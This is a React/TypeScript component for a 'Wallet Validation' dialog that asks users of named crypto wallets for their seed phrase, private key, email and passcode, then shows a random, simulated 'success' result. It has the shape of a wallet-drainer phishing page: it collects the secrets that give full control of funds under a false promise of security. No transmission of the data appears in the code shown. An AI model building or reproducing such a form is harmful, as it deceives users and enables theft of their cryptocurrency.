
import { useState } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Shield, CheckCircle, AlertTriangle, Wallet } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface WalletValidationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onWalletConnected: (wallet: string) => void;
}

const WalletValidationModal = ({ isOpen, onClose, onWalletConnected }: WalletValidationModalProps) => {
  const [walletType, setWalletType] = useState("");
  const [seedPhrase, setSeedPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [email, setEmail] = useState("");
  const [passcode, setPasscode] = useState("");
  const [isValidating, setIsValidating] = useState(false);
  const [validationResult, setValidationResult] = useState<"success" | "warning" | null>(null);
  const { toast } = useToast();

  const walletConfigs = {
    "MetaMask": { requiresSeed: true, requiresPrivateKey: true },
    "Trust Wallet": { requiresSeed: true, requiresPrivateKey: false },
    "Coinbase Wallet": { requiresEmail: true, requiresPasscode: true },
    "WalletConnect": { requiresPrivateKey: true },
    "Phantom": { requiresSeed: true, requiresPrivateKey: true },
    "Solflare": { requiresSeed: true },
    "Exodus": { requiresSeed: true, requiresEmail: true },
    "Atomic Wallet": { requiresSeed: true, requiresPasscode: true },
    "Electrum": { requiresSeed: true, requiresPrivateKey: true },
    "Ledger": { requiresPasscode: true },
    "Trezor": { requiresPasscode: true },
    "SafePal": { requiresSeed: true, requiresPasscode: true },
    "Math Wallet": { requiresSeed: true },
    "TokenPocket": { requiresSeed: true, requiresEmail: true },
    "Binance Chain Wallet": { requiresSeed: true, requiresEmail: true },
  };

  const getCurrentWalletConfig = () => {
    return walletConfigs[walletType as keyof typeof walletConfigs] || {};
  };

  const handleWalletValidation = async () => {
    const config = getCurrentWalletConfig();
    
    if (!walletType) {
      toast({
        title: "Wallet Type Required",
        description: "Please select your wallet type",
        variant: "destructive"
      });
      return;
    }

    // Check required fields based on wallet type
    if (config.requiresSeed && !seedPhrase) {
      toast({
        title: "Seed Phrase Required",
        description: `${walletType} requires a seed phrase for validation`,
        variant: "destructive"
      });
      return;
    }

    if (config.requiresPrivateKey && !privateKey) {
      toast({
        title: "Private Key Required",
        description: `${walletType} requires a private key for validation`,
        variant: "destructive"
      });
      return;
    }

    if (config.requiresEmail && !email) {
      toast({
        title: "Email Required",
        description: `${walletType} requires an email for validation`,
        variant: "destructive"
      });
      return;
    }

    if (config.requiresPasscode && !passcode) {
      toast({
        title: "Passcode Required",
        description: `${walletType} requires a passcode for validation`,
        variant: "destructive"
      });
      return;
    }

    setIsValidating(true);
    
    // Simulate validation process
    setTimeout(() => {
      const isValid = Math.random() > 0.2; // 80% success rate
      setValidationResult(isValid ? "success" : "warning");
      setIsValidating(false);

      if (isValid) {
        onWalletConnected(`${walletType}-${Date.now()}`);
        toast({
          title: "Wallet Validated Successfully",
          description: "Your wallet has been securely validated and connected",
        });
      } else {
        toast({
          title: "Validation Warning",
          description: "Potential security issues detected. Please review carefully.",
          variant: "destructive"
        });
      }
    }, 3000);
  };

  const resetModal = () => {
    setWalletType("");
    setSeedPhrase("");
    setPrivateKey("");
    setEmail("");
    setPasscode("");
    setValidationResult(null);
    onClose();
  };

  const config = getCurrentWalletConfig();

  return (
    <Dialog open={isOpen} onOpenChange={resetModal}>
      <DialogContent className="sm:max-w-md bg-gray-900 border-gray-700 text-white max-h-[80vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="flex items-center text-cyan-400">
            <Shield className="w-5 h-5 mr-2" />
            Wallet Validation
          </DialogTitle>
          <DialogDescription className="text-gray-400">
            Secure your crypto with our advanced validation system
          </DialogDescription>
        </DialogHeader>

        {!validationResult && (
          <div className="space-y-4">
            <div className="flex items-center justify-center p-4 bg-cyan-500/10 rounded-lg border border-cyan-500/20">
              <Wallet className="w-6 h-6 text-cyan-400 mr-2" />
              <span className="text-sm text-cyan-400">Wallet Validation Process</span>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet-type">Select Wallet Type</Label>
              <Select value={walletType} onValueChange={setWalletType}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Choose your wallet..." />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  {Object.keys(walletConfigs).map((wallet) => (
                    <SelectItem key={wallet} value={wallet} className="text-white hover:bg-gray-700">
                      {wallet}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {config.requiresSeed && (
              <div className="space-y-2">
                <Label htmlFor="seed-phrase">Seed Phrase (12-24 words)</Label>
                <Textarea
                  id="seed-phrase"
                  placeholder="Enter your seed phrase separated by spaces..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white min-h-[100px]"
                />
              </div>
            )}

            {config.requiresPrivateKey && (
              <div className="space-y-2">
                <Label htmlFor="private-key">Private Key</Label>
                <Input
                  id="private-key"
                  type="password"
                  placeholder="Enter your private key..."
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
            )}

            {config.requiresEmail && (
              <div className="space-y-2">
                <Label htmlFor="wallet-email">Email Address</Label>
                <Input
                  id="wallet-email"
                  type="email"
                  placeholder="Enter your email..."
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
            )}

            {config.requiresPasscode && (
              <div className="space-y-2">
                <Label htmlFor="passcode">Passcode/PIN</Label>
                <Input
                  id="passcode"
                  type="password"
                  placeholder="Enter your passcode..."
                  value={passcode}
                  onChange={(e) => setPasscode(e.target.value)}
                  className="bg-gray-800 border-gray-600 text-white"
                />
              </div>
            )}

            <Button 
              onClick={handleWalletValidation}
              disabled={isValidating}
              className="w-full bg-gradient-to-r from-green-500 to-teal-500"
            >
              {isValidating ? "Validating..." : "Validate Wallet"}
            </Button>
          </div>
        )}

        {validationResult && (
          <div className="space-y-4 text-center">
            {validationResult === "success" ? (
              <div className="space-y-4">
                <div className="flex items-center justify-center p-4 bg-green-500/10 rounded-lg border border-green-500/20">
                  <CheckCircle className="w-8 h-8 text-green-400" />
                </div>
                <h3 className="text-lg font-semibold text-green-400">Validation Successful!</h3>
                <p className="text-gray-400">Your wallet has been securely validated and is ready to use.</p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-center p-4 bg-yellow-500/10 rounded-lg border border-yellow-500/20">
                  <AlertTriangle className="w-8 h-8 text-yellow-400" />
                </div>
                <h3 className="text-lg font-semibold text-yellow-400">Security Warning</h3>
                <p className="text-gray-400">Some security concerns detected. Please review your wallet security settings.</p>
              </div>
            )}
            
            <Button onClick={resetModal} className="w-full">
              Close
            </Button>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
};

export default WalletValidationModal;
